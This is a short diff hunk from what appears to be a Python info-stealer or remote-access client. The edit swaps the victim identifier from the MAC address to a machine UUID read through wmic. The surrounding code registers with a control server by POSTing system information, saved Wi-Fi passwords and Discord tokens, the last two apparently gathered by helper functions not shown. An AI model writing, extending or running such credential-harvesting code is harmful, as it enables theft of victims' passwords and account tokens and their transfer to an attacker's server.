@@ -24,9 +24,11 @@ except Exception as e:
 remote_server = '127.0.0.1:5000'
 protocol = 'http'
 
+current_machine_id = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
+
 # Request a client ID from the server
 try:
-	clientIdreq = post(f'{protocol}://{remote_server}/client', json={"mac": ''.join(re.findall('..', '%012x' % uuid.getnode())),"osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
+	clientIdreq = post(f'{protocol}://{remote_server}/client', json={"uuid": current_machine_id, "osInfo": System_information().replace("\n", "<br>"), "wifis": getPasswords(), "discordInfo": GetDiscordTokens().replace("\n", "<br>")})
 	clientId = clientIdreq.text
 	print(clientId)
 except Exception as e:
